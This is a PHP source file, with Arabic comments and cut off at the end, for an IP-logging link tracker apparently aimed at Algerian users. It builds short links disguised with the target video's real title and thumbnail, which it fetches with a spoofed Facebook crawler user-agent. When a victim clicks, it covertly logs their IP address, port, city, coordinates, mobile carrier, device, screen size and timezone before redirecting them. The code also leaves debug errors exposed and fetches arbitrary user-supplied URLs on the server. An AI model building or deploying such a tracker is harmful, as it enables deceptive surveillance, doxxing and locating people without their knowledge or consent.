<?php
// ضبط المنطقة الزمنية للجزائر بدقة
date_default_timezone_set('Africa/Algiers');

// إظهار الأخطاء للتشخيص
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

try {
    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        meta_title TEXT,
        meta_image TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        country TEXT, 
        city TEXT, 
        lat TEXT, 
        lon TEXT, 
        isp TEXT, 
        device_info TEXT, 
        screen_res TEXT, 
        timezone TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("خطأ في قاعدة البيانات: " . htmlspecialchars($e->getMessage()));
}

// دالة سحب غلاف وعنوان الفيديو بدقة
function fetch_meta_details($url) {
    $parsed_url = parse_url($url);
    $title =$parsed_url['host'] ?? 'فيديو مشارك';
    $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";

    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
        $video_id =$matches[1];
        $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
    } else {
        $options = [
            'http' => [
                'method' => "GET",
                'header' => "User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)\r\n",
                'timeout' => 2
            ]
        ];
        $context = stream_context_create($options);$html = @file_get_contents($url, false,$context);

        if ($html) {
            if (preg_match('/<property="og:title"\s+content="([^"]+)"/i', $html,$m) || preg_match('/<title>(.*?)<\/title>/i', $html,$m)) {
                $title = html_entity_decode($m[1], ENT_QUOTES, 'UTF-8');
            }
            if (preg_match('/<property="og:image"\s+content="([^"]+)"/i', $html,$m)) {
                $image =$m[1];
            }
        }
    }

    return ['title' => $title, 'image' =>$image];
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function parse_isp($isp_name, $org_name) {$combined = $isp_name . ' ' .$org_name;
    if (stripos($combined, 'Mobilis') !== false or stripos($combined, 'ATM') !== false) return 'موبيليس (Mobilis)';
    if (stripos($combined, 'Djezzy') !== false or stripos($combined, 'Optimum Telecom') !== false) return 'جازي (Djezzy)';
    if (stripos($combined, 'Ooredoo') !== false or stripos($combined, 'Wataniya') !== false) return 'أوريدو (Ooredoo)';
    if (stripos($combined, 'Algérie Télécom') !== false or stripos($combined, 'Algerie Telecom') !== false or stripos($combined, 'AT') !== false) return 'اتصالات الجزائر (Algérie Télécom)';
    return trim($isp_name) ?: 'شبكة غير معروفة';
}

function get_device_type($ua) {$brand = 'جهاز ذكي';
    if (stripos($ua, 'Samsung') !== false)$brand = 'سامسونج (Samsung)';
    elseif (stripos($ua, 'iPhone') !== false)$brand = 'آيفون (iPhone)';
    elseif (stripos($ua, 'Huawei') !== false)$brand = 'هواوي (Huawei)';
    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false or stripos($ua, 'POCO') !== false)$brand = 'شاومي (Xiaomi)';
    elseif (stripos($ua, 'Oppo') !== false)$brand = 'أوبو (Oppo)';
    elseif (stripos($ua, 'Vivo') !== false)$brand = 'فيفو (Vivo)';
    elseif (stripos($ua, 'Realme') !== false)$brand = 'ريلمي (Realme)';

    if (stripos($ua, 'Android') !== false) return$brand . ' - أندرويد';
    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return$brand . ' - iOS';
    if (stripos($ua, 'Windows') !== false) return 'حاسوب - ويندوز';
    if (stripos($ua, 'Macintosh') !== false or stripos($ua, 'Mac OS') !== false) return 'حاسوب - ماك';
    if (stripos($ua, 'Linux') !== false) return 'نظام لينكس';
    return 'جهاز غير معروف';
}

function get_ip_details($ip) {
    if ($ip == '127.0.0.1' or $ip == '::1' or$ip == 'Unknown' or strpos($ip, '10.') === 0 or strpos($ip, '192.168.') === 0) {
        return ['country' => 'الجزائر (محلي)', 'city' => 'شبكة داخلية', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'شبكة محلية (Localhost)'];
    }
    $json = @file_get_contents("http://ip-api.com/json/" . $ip . "?fields=status,country,city,lat,lon,isp,org");
    $data = json_decode($json, true);
    if ($data and isset($data['status']) and$data['status'] == 'success') {
        return [
            'country' => $data['country'] ?? 'غير معروف',
            'city' => $data['city'] ?? 'غير معروف',
            'lat' => $data['lat'] ?? '36.7538', 'lon' =>$data['lon'] ?? '3.0588',
            'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
        ];
    }
    return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
}

$og_title = "فيديو مشارك";
$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";

// 1. معالجة إعادة التوجيه الفوري
if (isset($_GET['r'])) {
    $code =$_GET['r'];
    $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link =$stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $target =$link['target_url'];
        $og_title = !empty($link['meta_title']) ? $link['meta_title'] :$og_title;
        $og_image = !empty($link['meta_image']) ? $link['meta_image'] :$og_image;

        $public_ip = get_real_ip();
        $local_ip =$_SERVER['REMOTE_ADDR'] ?? 'غير متوفر';
        $port =$_SERVER['REMOTE_PORT'] ?? 'غير متوفر';
        $geo = get_ip_details($public_ip);
        $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $device = get_device_type($ua);
        $screen =$_GET['screen'] ?? 'غير متوفر';
        $tz =$_GET['tz'] ?? 'غير متوفر';
        $created_at = date('Y-m-d H:i:s');

        if (isset($_GET['screen'])) {
            try {
                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                $logStmt->execute([$code, $public_ip,$local_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$screen, $tz,$created_at]);
            } catch (Exception $e) {}

            header("Location: " . $target);
            exit();
        }
    } else {
        die("الرابط غير موجود.");
    }
}

// 2. إنشاء رابط جديد
$generated_link = "";
$tracking_code = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $meta = fetch_meta_details($target_url);

    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $stmt =$db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image) VALUES (?, ?, ?, ?)");
    $stmt->execute([$code,$target_url, $meta['title'],$meta['image']]);

    $tracking_code =$code;
    $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
}

$total_links =$db->query("SELECT COUNT(*) FROM links")->fetchColumn();
$total_visits =$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();

$filter_code =
